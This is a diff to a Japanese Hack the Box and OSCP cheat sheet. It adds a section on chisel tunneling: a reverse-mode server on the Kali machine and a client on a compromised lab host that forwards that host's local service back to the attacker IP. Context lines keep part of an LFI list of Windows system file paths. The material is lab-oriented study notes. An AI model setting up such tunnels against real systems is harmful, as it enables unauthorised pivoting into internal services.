@@ -47,6 +47,7 @@ Hack the Box の攻略や、OSCP 取得を目指すためのチートシート�
 - [SQL injection](#SQLインジェクション)
 - [XML injection](#XMLインジェクション)
 - [LFI](#LFI)
+- [Tunneling](#Tunneling)
 - [リバースエンジニアリング](#リバースエンジニアリング)
 - [Windowsコマンド](#Windowsコマンド)
 - [便利コマンド](#便利コマンド)
@@ -1476,6 +1477,29 @@ Windows
 /autoexec.bat
 /windows/system32/drivers/etc/hosts
 /windows/repair/S
+```
+
+
+## Tunneling
+
+### chisel
+
+chiselは、WebSocketを使用したGo言語で作られたTCPトンネリングツールであり、トンネリング通信はSSHで暗号化されている。
+
+[動画](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s)
+
+[日本語記事](https://www.lac.co.jp/lacwatch/people/20200212_002127.html)
+
+<img src="https://user-images.githubusercontent.com/39001773/132415568-8f9573e4-012f-47f1-8e3a-7dcd041f566d.png" width=400>
+
+```
+kali:./chisel server -p 8000 -reverse -v
+
+strapi: ./chisel client 10.10.14.23:8000 R:8001:localhost:8000
+(ただ、kali上で、netstat すると、全て(0.0.0.0)の8001への接続で、strapi上の8000のサービスへのアクセスができてしまうので、セキュリティがまずいので、以下のコマンド)
+
+strapi: ./chisel client 10.10.14.23:8000 R:127.0.0.1:8001:localhost:8000
+
 ```
 
 ## リバースエンジニアリング
